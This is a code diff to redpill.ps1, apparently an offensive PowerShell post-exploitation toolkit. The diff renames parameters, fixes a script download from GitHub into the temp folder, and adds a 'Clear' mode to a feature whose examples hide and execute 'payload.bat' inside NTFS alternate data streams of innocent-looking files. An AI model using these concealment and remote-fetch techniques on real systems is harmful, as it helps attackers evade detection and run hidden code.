@@ -76,8 +76,8 @@
    [string]$GetLogs="false", [string]$Upload="false", [string]$Camera="false",
    [string]$EOP="false", [string]$MsgBox="false", [string]$Range="1,255",
    [string]$Date="false", [string]$ADS="false", [string]$Help="false",
-   [string]$Exec="false", [string]$InLegitFile="false", [int]$Delay='1',
-   [string]$HiddeDataOf="false", [int]$Rate='1', [int]$TimeOut='5',
+   [string]$Exec="false", [string]$InTextFile="false", [int]$Delay='1',
+   [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
    [int]$BeaconTime='10', [int]$Interval='10', [int]$NewEst='10',
    [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
    [int]$SPort='8080', [int]$ButtonType='0'
@@ -189,7 +189,7 @@ If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){
 
    ## Download Sysinfo.ps1 from my GitHub
    If(-not(Test-Path -Path "$Env:TMP\Sysinfo.ps1")){## Download Sysinfo.ps1 from my GitHub repository
-      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Sysinfo.ps1" -EA SilentlyContinue).length/1KB)
       If($SizeDump -lt 14){## Corrupted download detected => DefaultFileSize: 14,68359375/KB
@@ -1200,7 +1200,7 @@ If($EOP -ieq "Verbose" -or $EOP -ieq "Enum"){
    Write-Host "";Start-Sleep -Seconds 1
 }
 
-If($ADS -ieq "Enum" -or $ADS -ieq "Create" -or $ADS -ieq "Exec"){
+If($ADS -ieq "Enum" -or $ADS -ieq "Create" -or $ADS -ieq "Exec" -or $ADS -ieq "Clear"){
 
    <#
    .SYNOPSIS
@@ -1217,19 +1217,19 @@ If($ADS -ieq "Enum" -or $ADS -ieq "Create" -or $ADS -ieq "Exec"){
       Remark: Payload.[extension] + legit.txt must be on the same dir.
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -ADS Enum -HiddeDataOf "payload.bat" -StartDir "$Env:TMP"
+      PS C:\> .\redpill.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "$Env:TMP"
       Search recursive for payload.bat ADS stream record existence starting on -StartDir [ dir ]
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -ADS Create -HiddeDataOf "Payload.bat" -InLegitFile "legit.txt"
+      PS C:\> .\redpill.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
       Hidde the data of Payload.bat script inside legit.txt ADS $DATA record
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -ADS Exec -HiddeDataOf "payload.bat" -InLegitFile "legit.mp3"
-      Execute\Access the alternate data stream of the sellected -InLegitFile [ file ]
+      PS C:\> .\redpill.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
+      Execute\Access the alternate data stream of the sellected -InTextFile [ file ]
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -ADS Clear -HiddeDataOf "Payload.bat" -InLegitFile "legit.txt"
+      PS C:\> .\redpill.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
       Delete payload.bat ADS $DATA stream from legit.txt text file records
 
    .OUTPUTS
@@ -2618,16 +2618,20 @@ $HelpParameters = @"
       Remark: Supported Payload Extensions are: txt | bat | ps1 | exe
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -ADS Enum -HiddeDataOf "payload.bat" -StartDir "`$Env:TMP"
-      Search recursive for payload.bat ADS stream record existence, starting on -StartDir [ dir ]
+      PS C:\> .\redpill.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "`$Env:TMP"
+      Search recursive for payload.bat ADS stream record existence starting on -StartDir [ dir ]
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -ADS Create -HiddeDataOf "Payload.bat" -InLegitFile "legit.txt"
-      Hidde the data of Payload.bat script inside legit.txt ADS stream `$DATA record
+      PS C:\> .\redpill.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
+      Hidde the data of Payload.bat script inside legit.txt ADS `$DATA record
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -ADS Exec -HiddeDataOf "payload.bat" -InLegitFile "legit.mp3"
-      Execute\Access the alternate data stream of the sellected -InLegitFile [ file ]
+      PS C:\> .\redpill.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
+      Execute\Access the alternate data stream of the sellected -InTextFile [ file ]
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
+      Delete payload.bat ADS `$DATA stream from legit.txt text file records
 
    .OUTPUTS
       AlternateDataStream
